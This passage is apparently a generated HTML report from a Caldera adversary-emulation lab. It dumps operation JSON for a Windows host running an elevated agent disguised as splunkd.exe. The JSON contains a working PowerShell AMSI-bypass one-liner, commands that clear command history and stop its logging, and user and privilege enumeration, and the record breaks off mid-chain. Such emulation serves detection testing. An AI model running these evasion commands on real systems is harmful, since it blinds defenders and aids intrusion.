@@ -1,0 +1,3620 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>Cyber Lab Orchestrator Report</title>
+<style>
+body { font-family: Arial, sans-serif; margin: 24px; background: #111; color: #eee; }
+.card { background: #1c1c1c; border: 1px solid #333; border-left: 6px solid #b22222; padding: 14px; margin: 14px 0; border-radius: 8px; }
+pre { white-space: pre-wrap; word-break: break-word; background: #0b0b0b; padding: 12px; border-radius: 6px; border: 1px solid #333; }
+table { border-collapse: collapse; width: 100%; background: #1c1c1c; }
+th, td { border: 1px solid #333; padding: 10px; text-align: left; vertical-align: top; }
+th { background: #222; } a { color: #7db8ff; }
+</style></head><body>
+<h1>Cyber Lab Orchestrator Report</h1>
+<p><strong>Generated:</strong> 2026-04-02T08:16:43Z</p>
+<ul>
+<li><strong>Session ID:</strong> apt-sim-20260402-100632_20260402_100632</li>
+<li><strong>Caldera:</strong> http://192.168.30.45:8888</li>
+<li><strong>Wazuh:</strong> 192.168.30.46</li>
+<li><strong>Target:</strong> 192.168.30.24</li>
+<li><strong>T-Pot:</strong> configurable / not set</li>
+
+</ul>
+<h2>Operation Details</h2><pre>{
+  &quot;id&quot;: &quot;b5989196-5d0b-4eb8-9571-0dc52e4c654b&quot;,
+  &quot;name&quot;: &quot;apt-sim-20260402-100632&quot;,
+  &quot;host_group&quot;: [
+    {
+      &quot;paw&quot;: &quot;fgdafj&quot;,
+      &quot;sleep_min&quot;: 30,
+      &quot;sleep_max&quot;: 60,
+      &quot;watchdog&quot;: 0,
+      &quot;group&quot;: &quot;red&quot;,
+      &quot;architecture&quot;: &quot;amd64&quot;,
+      &quot;platform&quot;: &quot;windows&quot;,
+      &quot;server&quot;: &quot;http://192.168.30.45:8888&quot;,
+      &quot;upstream_dest&quot;: &quot;http://192.168.30.45:8888&quot;,
+      &quot;username&quot;: &quot;WS10\\Administrator&quot;,
+      &quot;location&quot;: &quot;C:\\Users\\Public\\splunkd.exe&quot;,
+      &quot;pid&quot;: 6676,
+      &quot;ppid&quot;: 8956,
+      &quot;trusted&quot;: true,
+      &quot;executors&quot;: [
+        &quot;psh&quot;,
+        &quot;proc&quot;,
+        &quot;cmd&quot;
+      ],
+      &quot;privilege&quot;: &quot;Elevated&quot;,
+      &quot;exe_name&quot;: &quot;splunkd.exe&quot;,
+      &quot;host&quot;: &quot;WS10&quot;,
+      &quot;contact&quot;: &quot;HTTP&quot;,
+      &quot;proxy_receivers&quot;: {},
+      &quot;proxy_chain&quot;: [],
+      &quot;origin_link_id&quot;: &quot;&quot;,
+      &quot;deadman_enabled&quot;: true,
+      &quot;available_contacts&quot;: [
+        &quot;HTTP&quot;
+      ],
+      &quot;host_ip_addrs&quot;: [
+        &quot;192.168.30.24&quot;
+      ],
+      &quot;display_name&quot;: &quot;WS10$WS10\\Administrator&quot;,
+      &quot;created&quot;: &quot;2026-04-01T13:44:55Z&quot;,
+      &quot;last_seen&quot;: &quot;2026-04-02T08:05:41Z&quot;,
+      &quot;links&quot;: [
+        {
+          &quot;id&quot;: &quot;2804c127-3d46-4aa8-bbc6-48418fbd114b&quot;,
+          &quot;paw&quot;: &quot;fgdafj&quot;,
+          &quot;command&quot;: &quot;Q2xlYXItSGlzdG9yeTtDbGVhcg==&quot;,
+          &quot;plaintext_command&quot;: &quot;Q2xlYXItSGlzdG9yeTtDbGVhcg==&quot;,
+          &quot;status&quot;: 0,
+          &quot;score&quot;: 0,
+          &quot;jitter&quot;: 0,
+          &quot;decide&quot;: &quot;2026-04-01T13:44:55Z&quot;,
+          &quot;pin&quot;: 0,
+          &quot;pid&quot;: &quot;9040&quot;,
+          &quot;facts&quot;: [],
+          &quot;relationships&quot;: [],
+          &quot;used&quot;: [],
+          &quot;unique&quot;: &quot;2804c127-3d46-4aa8-bbc6-48418fbd114b&quot;,
+          &quot;collect&quot;: &quot;2026-04-01T13:44:55Z&quot;,
+          &quot;finish&quot;: &quot;2026-04-01T13:44:55Z&quot;,
+          &quot;ability&quot;: {
+            &quot;ability_id&quot;: &quot;43b3754c-def4-4699-a673-1d85648fda6a&quot;,
+            &quot;tactic&quot;: &quot;defense-evasion&quot;,
+            &quot;technique_name&quot;: &quot;Indicator Removal on Host: Clear Command History&quot;,
+            &quot;technique_id&quot;: &quot;T1070.003&quot;,
+            &quot;name&quot;: &quot;Avoid logs&quot;,
+            &quot;description&quot;: &quot;Stop terminal from logging history&quot;,
+            &quot;executors&quot;: [
+              {
+                &quot;name&quot;: &quot;sh&quot;,
+                &quot;platform&quot;: &quot;darwin&quot;,
+                &quot;command&quot;: &quot;&gt; $HOME/.bash_history &amp;&amp; unset HISTFILE&quot;,
+                &quot;code&quot;: null,
+                &quot;language&quot;: null,
+                &quot;build_target&quot;: null,
+                &quot;payloads&quot;: [],
+                &quot;uploads&quot;: [],
+                &quot;timeout&quot;: 60,
+                &quot;parsers&quot;: [],
+                &quot;cleanup&quot;: [],
+                &quot;variations&quot;: [],
+                &quot;additional_info&quot;: {}
+              },
+              {
+                &quot;name&quot;: &quot;sh&quot;,
+                &quot;platform&quot;: &quot;linux&quot;,
+                &quot;command&quot;: &quot;&gt; $HOME/.bash_history &amp;&amp; unset HISTFILE&quot;,
+                &quot;code&quot;: null,
+                &quot;language&quot;: null,
+                &quot;build_target&quot;: null,
+                &quot;payloads&quot;: [],
+                &quot;uploads&quot;: [],
+                &quot;timeout&quot;: 60,
+                &quot;parsers&quot;: [],
+                &quot;cleanup&quot;: [],
+                &quot;variations&quot;: [],
+                &quot;additional_info&quot;: {}
+              },
+              {
+                &quot;name&quot;: &quot;psh&quot;,
+                &quot;platform&quot;: &quot;windows&quot;,
+                &quot;command&quot;: &quot;Clear-History;Clear&quot;,
+                &quot;code&quot;: null,
+                &quot;language&quot;: null,
+                &quot;build_target&quot;: null,
+                &quot;payloads&quot;: [],
+                &quot;uploads&quot;: [],
+                &quot;timeout&quot;: 60,
+                &quot;parsers&quot;: [],
+                &quot;cleanup&quot;: [],
+                &quot;variations&quot;: [],
+                &quot;additional_info&quot;: {}
+              }
+            ],
+            &quot;requirements&quot;: [],
+            &quot;privilege&quot;: null,
+            &quot;repeatable&quot;: false,
+            &quot;buckets&quot;: [
+              &quot;defense-evasion&quot;
+            ],
+            &quot;additional_info&quot;: {},
+            &quot;access&quot;: {},
+            &quot;singleton&quot;: false,
+            &quot;plugin&quot;: &quot;stockpile&quot;,
+            &quot;delete_payload&quot;: true
+          },
+          &quot;executor&quot;: {
+            &quot;name&quot;: &quot;psh&quot;,
+            &quot;platform&quot;: &quot;windows&quot;,
+            &quot;command&quot;: &quot;Clear-History;Clear&quot;,
+            &quot;code&quot;: null,
+            &quot;language&quot;: null,
+            &quot;build_target&quot;: null,
+            &quot;payloads&quot;: [],
+            &quot;uploads&quot;: [],
+            &quot;timeout&quot;: 60,
+            &quot;parsers&quot;: [],
+            &quot;cleanup&quot;: [],
+            &quot;variations&quot;: [],
+            &quot;additional_info&quot;: {}
+          },
+          &quot;cleanup&quot;: 0,
+          &quot;visibility&quot;: {
+            &quot;score&quot;: 50,
+            &quot;adjustments&quot;: []
+          },
+          &quot;host&quot;: &quot;WS10&quot;,
+          &quot;output&quot;: &quot;False&quot;,
+          &quot;deadman&quot;: false,
+          &quot;agent_reported_time&quot;: &quot;2026-04-01T13:44:56Z&quot;
+        }
+      ],
+      &quot;pending_contact&quot;: &quot;HTTP&quot;,
+      &quot;status&quot;: &quot;alive&quot;
+    }
+  ],
+  &quot;adversary&quot;: {
+    &quot;adversary_id&quot;: &quot;temp-seed-fgdafj-1775117192&quot;,
+    &quot;name&quot;: &quot;Temp Seed Windows - gruppo1&quot;,
+    &quot;description&quot;: &quot;Auto-generated seed adversary from 6308830d-3d43-4e01-9057-1a63a25d0b74 for agent fgdafj&quot;,
+    &quot;atomic_ordering&quot;: [
+      &quot;discovery_users&quot;,
+      &quot;amsi_bypass&quot;,
+      &quot;collection_files&quot;,
+      &quot;c2_internal&quot;,
+      &quot;persistence_registry&quot;
+    ],
+    &quot;objective&quot;: &quot;495a9828-cab1-44dd-a0ca-66e58177d8cc&quot;,
+    &quot;tags&quot;: [],
+    &quot;has_repeatable_abilities&quot;: false,
+    &quot;plugin&quot;: &quot;&quot;
+  },
+  &quot;jitter&quot;: &quot;2/8&quot;,
+  &quot;planner&quot;: {
+    &quot;id&quot;: &quot;aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a&quot;,
+    &quot;name&quot;: &quot;atomic&quot;,
+    &quot;module&quot;: &quot;app.planners.atomic&quot;,
+    &quot;params&quot;: {},
+    &quot;description&quot;: &quot;During each phase of the operation, the atomic planner iterates through each agent and sends the next\navailable ability it thinks that agent can complete. This decision is based on the agent matching the operating\nsystem (execution platform) of the ability and the ability command having no unsatisfied variables.\nThe planner then waits for each agent to complete its command before determining the subsequent abilities.\nThe abilities are processed in the order set by each agent&#x27;s atomic ordering.\nFor instance, if agent A has atomic ordering (A1, A2, A3) and agent B has atomic ordering (B1, B2, B3), then\nthe planner would send (A1, B1) in the first phase, then (A2, B2), etc.\n&quot;,
+    &quot;stopping_conditions&quot;: [],
+    &quot;ignore_enforcement_modules&quot;: [],
+    &quot;allow_repeatable_abilities&quot;: false,
+    &quot;plugin&quot;: &quot;&quot;
+  },
+  &quot;start&quot;: &quot;2026-04-02T08:06:32Z&quot;,
+  &quot;state&quot;: &quot;running&quot;,
+  &quot;obfuscator&quot;: &quot;plain-text&quot;,
+  &quot;autonomous&quot;: 1,
+  &quot;chain&quot;: [],
+  &quot;auto_close&quot;: true,
+  &quot;visibility&quot;: 51,
+  &quot;objective&quot;: &quot;&quot;,
+  &quot;use_learning_parsers&quot;: true,
+  &quot;group&quot;: &quot;red&quot;,
+  &quot;source&quot;: {
+    &quot;id&quot;: &quot;ed32b9c3-9593-4c33-b0db-e2007315096b&quot;,
+    &quot;name&quot;: &quot;basic&quot;,
+    &quot;facts&quot;: [
+      {
+        &quot;unique&quot;: &quot;file.sensitive.extensionwav&quot;,
+        &quot;trait&quot;: &quot;file.sensitive.extension&quot;,
+        &quot;name&quot;: &quot;file.sensitive.extension&quot;,
+        &quot;value&quot;: &quot;wav&quot;,
+        &quot;created&quot;: &quot;2026-04-02T08:06:32Z&quot;,
+        &quot;score&quot;: 1,
+        &quot;source&quot;: &quot;ed32b9c3-9593-4c33-b0db-e2007315096b&quot;,
+        &quot;origin_type&quot;: &quot;SEEDED&quot;,
+        &quot;links&quot;: [],
+        &quot;relationships&quot;: [],
+        &quot;limit_count&quot;: -1,
+        &quot;collected_by&quot;: [],
+        &quot;technique_id&quot;: null
+      },
+      {
+        &quot;unique&quot;: &quot;file.sensitive.extensionyml&quot;,
+        &quot;trait&quot;: &quot;file.sensitive.extension&quot;,
+        &quot;name&quot;: &quot;file.sensitive.extension&quot;,
+        &quot;value&quot;: &quot;yml&quot;,
+        &quot;created&quot;: &quot;2026-04-02T08:06:32Z&quot;,
+        &quot;score&quot;: 1,
+        &quot;source&quot;: &quot;ed32b9c3-9593-4c33-b0db-e2007315096b&quot;,
+        &quot;origin_type&quot;: &quot;SEEDED&quot;,
+        &quot;links&quot;: [],
+        &quot;relationships&quot;: [],
+        &quot;limit_count&quot;: -1,
+        &quot;collected_by&quot;: [],
+        &quot;technique_id&quot;: null
+      },
+      {
+        &quot;unique&quot;: &quot;file.sensitive.extensionpng&quot;,
+        &quot;trait&quot;: &quot;file.sensitive.extension&quot;,
+        &quot;name&quot;: &quot;file.sensitive.extension&quot;,
+        &quot;value&quot;: &quot;png&quot;,
+        &quot;created&quot;: &quot;2026-04-02T08:06:32Z&quot;,
+        &quot;score&quot;: 1,
+        &quot;source&quot;: &quot;ed32b9c3-9593-4c33-b0db-e2007315096b&quot;,
+        &quot;origin_type&quot;: &quot;SEEDED&quot;,
+        &quot;links&quot;: [],
+        &quot;relationships&quot;: [],
+        &quot;limit_count&quot;: -1,
+        &quot;collected_by&quot;: [],
+        &quot;technique_id&quot;: null
+      },
+      {
+        &quot;unique&quot;: &quot;server.malicious.urlkeyloggedsite.com&quot;,
+        &quot;trait&quot;: &quot;server.malicious.url&quot;,
+        &quot;name&quot;: &quot;server.malicious.url&quot;,
+        &quot;value&quot;: &quot;keyloggedsite.com&quot;,
+        &quot;created&quot;: &quot;2026-04-02T08:06:32Z&quot;,
+        &quot;score&quot;: 1,
+        &quot;source&quot;: &quot;ed32b9c3-9593-4c33-b0db-e2007315096b&quot;,
+        &quot;origin_type&quot;: &quot;SEEDED&quot;,
+        &quot;links&quot;: [],
+        &quot;relationships&quot;: [],
+        &quot;limit_count&quot;: -1,
+        &quot;collected_by&quot;: [],
+        &quot;technique_id&quot;: null
+      }
+    ],
+    &quot;rules&quot;: [
+      {
+        &quot;action&quot;: &quot;DENY&quot;,
+        &quot;trait&quot;: &quot;file.sensitive.extension&quot;,
+        &quot;match&quot;: &quot;.*&quot;
+      },
+      {
+        &quot;action&quot;: &quot;ALLOW&quot;,
+        &quot;trait&quot;: &quot;file.sensitive.extension&quot;,
+        &quot;match&quot;: &quot;png&quot;
+      },
+      {
+        &quot;action&quot;: &quot;ALLOW&quot;,
+        &quot;trait&quot;: &quot;file.sensitive.extension&quot;,
+        &quot;match&quot;: &quot;yml&quot;
+      },
+      {
+        &quot;action&quot;: &quot;ALLOW&quot;,
+        &quot;trait&quot;: &quot;file.sensitive.extension&quot;,
+        &quot;match&quot;: &quot;wav&quot;
+      }
+    ],
+    &quot;adjustments&quot;: [],
+    &quot;relationships&quot;: [],
+    &quot;plugin&quot;: &quot;stockpile&quot;
+  },
+  &quot;_api_mode&quot;: &quot;v2&quot;,
+  &quot;_selector&quot;: {
+    &quot;agent_paw&quot;: &quot;fgdafj&quot;,
+    &quot;group&quot;: &quot;red&quot;,
+    &quot;selected_adversary_id&quot;: &quot;6308830d-3d43-4e01-9057-1a63a25d0b74&quot;,
+    &quot;operation_adversary_id&quot;: &quot;temp-seed-fgdafj-1775117192&quot;
+  },
+  &quot;_polled_status&quot;: {
+    &quot;op_id&quot;: &quot;b5989196-5d0b-4eb8-9571-0dc52e4c654b&quot;,
+    &quot;operation&quot;: {
+      &quot;id&quot;: &quot;b5989196-5d0b-4eb8-9571-0dc52e4c654b&quot;,
+      &quot;name&quot;: &quot;apt-sim-20260402-100632&quot;,
+      &quot;host_group&quot;: [
+        {
+          &quot;paw&quot;: &quot;fgdafj&quot;,
+          &quot;sleep_min&quot;: 30,
+          &quot;sleep_max&quot;: 60,
+          &quot;watchdog&quot;: 0,
+          &quot;group&quot;: &quot;red&quot;,
+          &quot;architecture&quot;: &quot;amd64&quot;,
+          &quot;platform&quot;: &quot;windows&quot;,
+          &quot;server&quot;: &quot;http://192.168.30.45:8888&quot;,
+          &quot;upstream_dest&quot;: &quot;http://192.168.30.45:8888&quot;,
+          &quot;username&quot;: &quot;WS10\\Administrator&quot;,
+          &quot;location&quot;: &quot;C:\\Users\\Public\\splunkd.exe&quot;,
+          &quot;pid&quot;: 6676,
+          &quot;ppid&quot;: 8956,
+          &quot;trusted&quot;: true,
+          &quot;executors&quot;: [
+            &quot;cmd&quot;,
+            &quot;psh&quot;,
+            &quot;proc&quot;
+          ],
+          &quot;privilege&quot;: &quot;Elevated&quot;,
+          &quot;exe_name&quot;: &quot;splunkd.exe&quot;,
+          &quot;host&quot;: &quot;WS10&quot;,
+          &quot;contact&quot;: &quot;HTTP&quot;,
+          &quot;proxy_receivers&quot;: {},
+          &quot;proxy_chain&quot;: [],
+          &quot;origin_link_id&quot;: &quot;&quot;,
+          &quot;deadman_enabled&quot;: true,
+          &quot;available_contacts&quot;: [
+            &quot;HTTP&quot;
+          ],
+          &quot;host_ip_addrs&quot;: [
+            &quot;192.168.30.24&quot;
+          ],
+          &quot;display_name&quot;: &quot;WS10$WS10\\Administrator&quot;,
+          &quot;created&quot;: &quot;2026-04-01T13:44:55Z&quot;,
+          &quot;last_seen&quot;: &quot;2026-04-02T08:15:46Z&quot;,
+          &quot;links&quot;: [
+            {
+              &quot;id&quot;: &quot;2804c127-3d46-4aa8-bbc6-48418fbd114b&quot;,
+              &quot;paw&quot;: &quot;fgdafj&quot;,
+              &quot;command&quot;: &quot;Q2xlYXItSGlzdG9yeTtDbGVhcg==&quot;,
+              &quot;plaintext_command&quot;: &quot;Q2xlYXItSGlzdG9yeTtDbGVhcg==&quot;,
+              &quot;status&quot;: 0,
+              &quot;score&quot;: 0,
+              &quot;jitter&quot;: 0,
+              &quot;decide&quot;: &quot;2026-04-01T13:44:55Z&quot;,
+              &quot;pin&quot;: 0,
+              &quot;pid&quot;: &quot;9040&quot;,
+              &quot;facts&quot;: [],
+              &quot;relationships&quot;: [],
+              &quot;used&quot;: [],
+              &quot;unique&quot;: &quot;2804c127-3d46-4aa8-bbc6-48418fbd114b&quot;,
+              &quot;collect&quot;: &quot;2026-04-01T13:44:55Z&quot;,
+              &quot;finish&quot;: &quot;2026-04-01T13:44:55Z&quot;,
+              &quot;ability&quot;: {
+                &quot;ability_id&quot;: &quot;43b3754c-def4-4699-a673-1d85648fda6a&quot;,
+                &quot;tactic&quot;: &quot;defense-evasion&quot;,
+                &quot;technique_name&quot;: &quot;Indicator Removal on Host: Clear Command History&quot;,
+                &quot;technique_id&quot;: &quot;T1070.003&quot;,
+                &quot;name&quot;: &quot;Avoid logs&quot;,
+                &quot;description&quot;: &quot;Stop terminal from logging history&quot;,
+                &quot;executors&quot;: [
+                  {
+                    &quot;name&quot;: &quot;sh&quot;,
+                    &quot;platform&quot;: &quot;darwin&quot;,
+                    &quot;command&quot;: &quot;&gt; $HOME/.bash_history &amp;&amp; unset HISTFILE&quot;,
+                    &quot;code&quot;: null,
+                    &quot;language&quot;: null,
+                    &quot;build_target&quot;: null,
+                    &quot;payloads&quot;: [],
+                    &quot;uploads&quot;: [],
+                    &quot;timeout&quot;: 60,
+                    &quot;parsers&quot;: [],
+                    &quot;cleanup&quot;: [],
+                    &quot;variations&quot;: [],
+                    &quot;additional_info&quot;: {}
+                  },
+                  {
+                    &quot;name&quot;: &quot;sh&quot;,
+                    &quot;platform&quot;: &quot;linux&quot;,
+                    &quot;command&quot;: &quot;&gt; $HOME/.bash_history &amp;&amp; unset HISTFILE&quot;,
+                    &quot;code&quot;: null,
+                    &quot;language&quot;: null,
+                    &quot;build_target&quot;: null,
+                    &quot;payloads&quot;: [],
+                    &quot;uploads&quot;: [],
+                    &quot;timeout&quot;: 60,
+                    &quot;parsers&quot;: [],
+                    &quot;cleanup&quot;: [],
+                    &quot;variations&quot;: [],
+                    &quot;additional_info&quot;: {}
+                  },
+                  {
+                    &quot;name&quot;: &quot;psh&quot;,
+                    &quot;platform&quot;: &quot;windows&quot;,
+                    &quot;command&quot;: &quot;Clear-History;Clear&quot;,
+                    &quot;code&quot;: null,
+                    &quot;language&quot;: null,
+                    &quot;build_target&quot;: null,
+                    &quot;payloads&quot;: [],
+                    &quot;uploads&quot;: [],
+                    &quot;timeout&quot;: 60,
+                    &quot;parsers&quot;: [],
+                    &quot;cleanup&quot;: [],
+                    &quot;variations&quot;: [],
+                    &quot;additional_info&quot;: {}
+                  }
+                ],
+                &quot;requirements&quot;: [],
+                &quot;privilege&quot;: null,
+                &quot;repeatable&quot;: false,
+                &quot;buckets&quot;: [
+                  &quot;defense-evasion&quot;
+                ],
+                &quot;additional_info&quot;: {},
+                &quot;access&quot;: {},
+                &quot;singleton&quot;: false,
+                &quot;plugin&quot;: &quot;stockpile&quot;,
+                &quot;delete_payload&quot;: true
+              },
+              &quot;executor&quot;: {
+                &quot;name&quot;: &quot;psh&quot;,
+                &quot;platform&quot;: &quot;windows&quot;,
+                &quot;command&quot;: &quot;Clear-History;Clear&quot;,
+                &quot;code&quot;: null,
+                &quot;language&quot;: null,
+                &quot;build_target&quot;: null,
+                &quot;payloads&quot;: [],
+                &quot;uploads&quot;: [],
+                &quot;timeout&quot;: 60,
+                &quot;parsers&quot;: [],
+                &quot;cleanup&quot;: [],
+                &quot;variations&quot;: [],
+                &quot;additional_info&quot;: {}
+              },
+              &quot;cleanup&quot;: 0,
+              &quot;visibility&quot;: {
+                &quot;score&quot;: 50,
+                &quot;adjustments&quot;: []
+              },
+              &quot;host&quot;: &quot;WS10&quot;,
+              &quot;output&quot;: &quot;False&quot;,
+              &quot;deadman&quot;: false,
+              &quot;agent_reported_time&quot;: &quot;2026-04-01T13:44:56Z&quot;
+            }
+          ],
+          &quot;pending_contact&quot;: &quot;HTTP&quot;,
+          &quot;status&quot;: &quot;alive&quot;
+        }
+      ],
+      &quot;adversary&quot;: {
+        &quot;adversary_id&quot;: &quot;temp-seed-fgdafj-1775117192&quot;,
+        &quot;name&quot;: &quot;Temp Seed Windows - gruppo1&quot;,
+        &quot;description&quot;: &quot;Auto-generated seed adversary from 6308830d-3d43-4e01-9057-1a63a25d0b74 for agent fgdafj&quot;,
+        &quot;atomic_ordering&quot;: [
+          &quot;discovery_users&quot;,
+          &quot;amsi_bypass&quot;,
+          &quot;collection_files&quot;,
+          &quot;c2_internal&quot;,
+          &quot;persistence_registry&quot;
+        ],
+        &quot;objective&quot;: &quot;495a9828-cab1-44dd-a0ca-66e58177d8cc&quot;,
+        &quot;tags&quot;: [],
+        &quot;has_repeatable_abilities&quot;: false,
+        &quot;plugin&quot;: &quot;&quot;
+      },
+      &quot;jitter&quot;: &quot;2/8&quot;,
+      &quot;planner&quot;: {
+        &quot;id&quot;: &quot;aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a&quot;,
+        &quot;name&quot;: &quot;atomic&quot;,
+        &quot;module&quot;: &quot;app.planners.atomic&quot;,
+        &quot;params&quot;: {},
+        &quot;description&quot;: &quot;During each phase of the operation, the atomic planner iterates through each agent and sends the next\navailable ability it thinks that agent can complete. This decision is based on the agent matching the operating\nsystem (execution platform) of the ability and the ability command having no unsatisfied variables.\nThe planner then waits for each agent to complete its command before determining the subsequent abilities.\nThe abilities are processed in the order set by each agent&#x27;s atomic ordering.\nFor instance, if agent A has atomic ordering (A1, A2, A3) and agent B has atomic ordering (B1, B2, B3), then\nthe planner would send (A1, B1) in the first phase, then (A2, B2), etc.\n&quot;,
+        &quot;stopping_conditions&quot;: [],
+        &quot;ignore_enforcement_modules&quot;: [],
+        &quot;allow_repeatable_abilities&quot;: false,
+        &quot;plugin&quot;: &quot;&quot;
+      },
+      &quot;start&quot;: &quot;2026-04-02T08:06:32Z&quot;,
+      &quot;state&quot;: &quot;finished&quot;,
+      &quot;obfuscator&quot;: &quot;plain-text&quot;,
+      &quot;autonomous&quot;: 1,
+      &quot;chain&quot;: [
+        {
+          &quot;id&quot;: &quot;1819c5bc-8eca-48a6-9eef-fbecb36df769&quot;,
+          &quot;paw&quot;: &quot;fgdafj&quot;,
+          &quot;command&quot;: &quot;whoamiwhoami /privnet usernet localgroup administrators&quot;,
+          &quot;plaintext_command&quot;: &quot;whoamiwhoami /privnet usernet localgroup administrators&quot;,
+          &quot;status&quot;: 1,
+          &quot;score&quot;: 0,
+          &quot;decide&quot;: &quot;2026-04-02T08:06:33Z&quot;,
+          &quot;pin&quot;: 0,
+          &quot;pid&quot;: &quot;6104&quot;,
+          &quot;facts&quot;: [],
+          &quot;relationships&quot;: [],
+          &quot;used&quot;: [],
+          &quot;unique&quot;: &quot;1819c5bc-8eca-48a6-9eef-fbecb36df769&quot;,
+          &quot;collect&quot;: &quot;2026-04-02T08:06:39Z&quot;,
+          &quot;finish&quot;: &quot;2026-04-02T08:06:39Z&quot;,
+          &quot;ability&quot;: {
+            &quot;ability_id&quot;: &quot;discovery_users&quot;,
+            &quot;tactic&quot;: &quot;discovery&quot;,
+            &quot;technique_name&quot;: &quot;System Owner/User Discovery&quot;,
+            &quot;technique_id&quot;: &quot;T1033&quot;,
+            &quot;name&quot;: &quot;User Discovery&quot;,
+            &quot;description&quot;: &quot;Enumerate current identity, privileges, and administrators.&quot;,
+            &quot;executors&quot;: [
+              {
+                &quot;name&quot;: &quot;psh&quot;,
+                &quot;platform&quot;: &quot;windows&quot;,
+                &quot;command&quot;: &quot;whoami\nwhoami /priv\nnet user\nnet localgroup administrators\n&quot;,
+                &quot;code&quot;: null,
+                &quot;language&quot;: null,
+                &quot;build_target&quot;: null,
+                &quot;payloads&quot;: [],
+                &quot;uploads&quot;: [],
+                &quot;timeout&quot;: 60,
+                &quot;parsers&quot;: [],
+                &quot;cleanup&quot;: [],
+                &quot;variations&quot;: [],
+                &quot;additional_info&quot;: {}
+              }
+            ],
+            &quot;requirements&quot;: [],
+            &quot;privilege&quot;: null,
+            &quot;repeatable&quot;: false,
+            &quot;buckets&quot;: [
+              &quot;discovery&quot;
+            ],
+            &quot;additional_info&quot;: {},
+            &quot;access&quot;: {},
+            &quot;singleton&quot;: false,
+            &quot;plugin&quot;: &quot;&quot;,
+            &quot;delete_payload&quot;: true
+          },
+          &quot;executor&quot;: {
+            &quot;name&quot;: &quot;psh&quot;,
+            &quot;platform&quot;: &quot;windows&quot;,
+            &quot;command&quot;: &quot;whoami\nwhoami /priv\nnet user\nnet localgroup administrators\n&quot;,
+            &quot;code&quot;: null,
+            &quot;language&quot;: null,
+            &quot;build_target&quot;: null,
+            &quot;payloads&quot;: [],
+            &quot;uploads&quot;: [],
+            &quot;timeout&quot;: 60,
+            &quot;parsers&quot;: [],
+            &quot;cleanup&quot;: [],
+            &quot;variations&quot;: [],
+            &quot;additional_info&quot;: {}
+          },
+          &quot;cleanup&quot;: 0,
+          &quot;visibility&quot;: {
+            &quot;score&quot;: 50,
+            &quot;adjustments&quot;: []
+          },
+          &quot;host&quot;: &quot;WS10&quot;,
+          &quot;output&quot;: &quot;True&quot;,
+          &quot;deadman&quot;: false,
+          &quot;agent_reported_time&quot;: &quot;2026-04-02T08:06:39Z&quot;
+        },
+        {
+          &quot;id&quot;: &quot;420809c8-7777-4c24-bef8-677da2b7d67a&quot;,
+          &quot;paw&quot;: &quot;fgdafj&quot;,
+          &quot;command&quot;: &quot;$s=[Ref].Assembly.GetType(&#x27;System.Management.Automation.AmsiUtils&#x27;);$f=$s.GetField(&#x27;amsiInitFailed&#x27;,&#x27;NonPublic,Static&#x27;);$f.SetValue($null,$true)&quot;,
+          &quot;plaintext_command&quot;: &quot;$s=[Ref].Assembly.GetType(&#x27;System.Management.Automation.AmsiUtils&#x27;);$f=$s.GetField(&#x27;amsiInitFailed&#x27;,&#x27;NonPublic,Static&#x27;);$f.SetValue($null,$true)&quot;,
+          &quot;status&quot;: 0,
+          &quot;score&quot;: 0,
+          &quot;decide&quot;: &quot;2026-04-02T08:06:44Z&quot;,
+          &quot;pin&quot;: 0,
+          &quot;pid&quot;: &quot;6684&quot;,
+          &quot;facts&quot;: [],
+          &quot;relationships&quot;: [],
+          &quot;used&quot;: [],
+          &quot;unique&quot;: &quot;420809c8-7777-4c24-bef8-677da2b7d67a&quot;,
+          &quot;collect&quot;: &quot;2026-04-02T08:07:31Z&quot;,
+          &quot;finish&quot;: &quot;2026-04-02T08:07:31Z&quot;,
+          &quot;ability&quot;: {
+            &quot;ability_id&quot;: &quot;amsi_bypass&quot;,
+            &quot;tactic&quot;: &quot;defense-evasion&quot;,
+            &quot;technique_name&quot;: &quot;Impair Defenses&quot;,
+            &quot;technique_id&quot;: &quot;T1562.001&quot;,
+            &quot;name&quot;: &quot;AMSI Bypass&quot;,
+            &quot;description&quot;: &quot;Disable AMSI for the current PowerShell runspace.&quot;,
+            &quot;executors&quot;: [
+              {
+                &quot;name&quot;: &quot;psh&quot;,
+                &quot;platform&quot;: &quot;windows&quot;,
+                &quot;command&quot;: &quot;$s=[Ref].Assembly.GetType(&#x27;System.Management.Automation.AmsiUtils&#x27;);\n$f=$s.GetField(&#x27;amsiInitFailed&#x27;,&#x27;NonPublic,Static&#x27;);\n$f.SetValue($null,$true)\n&quot;,
+                &quot;code&quot;: null,
+                &quot;language&quot;: null,
+                &quot;build_target&quot;: null,
+                &quot;payloads&quot;: [],
+                &quot;uploads&quot;: [],
+                &quot;timeout&quot;: 60,
+                &quot;parsers&quot;: [],
+                &quot;cleanup&quot;: [],
+                &quot;variations&quot;: [],
+                &quot;additional_info&quot;: {}
+              }
+            ],
+            &quot;requirements&quot;: [],
+            &quot;privilege&quot;: null,
+            &quot;repeatable&quot;: false,
+            &quot;buckets&quot;: [
+              &quot;defense-evasion&quot;
+            ],
+            &quot;additional_info&quot;: {},
+            &quot;access&quot;: {},
+            &quot;singleton&quot;: false,
+            &quot;plugin&quot;: &quot;&quot;,
+            &quot;delete_payload&quot;: true
+          },
+          &quot;executor&quot;: {
+            &quot;name&quot;: &quot;psh&quot;,
+            &quot;platform&quot;: &quot;windows&quot;,
+            &quot;command&quot;: &quot;$s=[Ref].Assembly.GetType(&#x27;System.Management.Automation.AmsiUtils&#x27;);\n$f=$s.GetField(&#x27;amsiInitFailed&#x27;,&#x27;NonPublic,Static&#x27;);\n$f.SetValue($null,$true)\n&quot;,
+            &quot;code&quot;: null,
+            &quot;language&quot;: null,
+            &quot;build_target&quot;: null,
+            &quot;payloads&quot;: [],
+            &quot;uploads&quot;: [],
+            &quot;timeout&quot;: 60,
+            &quot;parsers&quot;: [],
+            &quot;cleanup&quot;: [],
+            &quot;variations&quot;: [],
+            &quot;additional_info&quot;: {}
+          },
+          &quot;cleanup&quot;: 0,
+          &quot;visibility&quot;: {
+            &quot;score&quot;: 50,
+            &quot;adjustments&quot;: []
+          },
+          &quot;host&quot;: &quot;WS10&quot;,
+          &quot;output&quot;: &quot;False&quot;,
+          &quot;deadman&quot;: false,
+          &quot;agent_reported_time&quot;: &quot;2026-04-02T08:07:31Z&quot;
+        },
+        {
+          &quot;id&quot;: &quot;adbe4b12-2ce6-4f95-8c27-3d5b067d7f35&quot;,
